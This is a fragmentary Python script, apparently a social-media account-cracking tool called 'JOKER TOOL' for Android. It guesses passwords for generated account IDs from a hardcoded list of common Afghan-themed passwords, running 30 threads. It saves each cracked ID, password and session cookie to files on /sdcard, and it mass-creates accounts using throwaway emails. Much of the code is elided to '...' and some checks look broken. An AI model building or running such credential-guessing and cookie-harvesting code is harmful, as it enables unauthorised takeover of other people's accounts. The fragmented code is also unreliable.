...
def approval():
  ...
  try:
    ...
    if realid in httpCaht:
      ...
      print('\33[1;37m ====================================================')
      print (" \33[37;41m\t WELCOME TO JOKER TOOL AND ENJOY \33[0;m")
      print('\33[1;37m ====================================================')
        ...
        try:
                ...
                if x == ("***"):
                        ...
                        if xd in ['1','01']:
                                ...
                                print(' PUT FILE EXAMPLE :  /sdcard/File.Joker.etc..')
                                linex()
...
def afg():
                ...
                with tred(max_workers=30) as TRT:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'afghan786','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
                                TRT.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' THE PROCESS HAS COMPLETED')
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                     ...
                                     #   print("\r\r\033[1;33m Cookie: "+coki)
                                        ...
                                        if 'y' in pcp:
                                              #  print('\r\r\x1b[1;31m [ALONE-JOKER-CP] '+ids+' | '+pas+'\033[1;97m')
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/JOKER-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
...
def Create():
    ...
    def strt():
       try:
           ...
           import sys
           loop+=1
           sys.stdout.write(f'\r\r\033[1;37m [𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑] \033[1;32mOK:%s \033[1;37m'%(ok));sys.stdout.flush()
           requests=r.Session()
           from fake_email import Email
           mmail=Email().Mail()
           em=mmail['mail']
           ...
           if "9":
              ...
              if requests=="chk":
                print("\r\r\033[1;32m [JOKER-CP] "+uid+'|'+pas+'|'+coki)
                cp+=1
                pass
                 ...
                 ok+=1
                 open('/sdcard/JOKER-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                 linex()
       except Exception as e:
           if not "urllib" and not "perma" in str(e):print(e)
           pass
    file="/sdcard/JOKER/CREATE-OK.txt"
    u=5000
    clear()
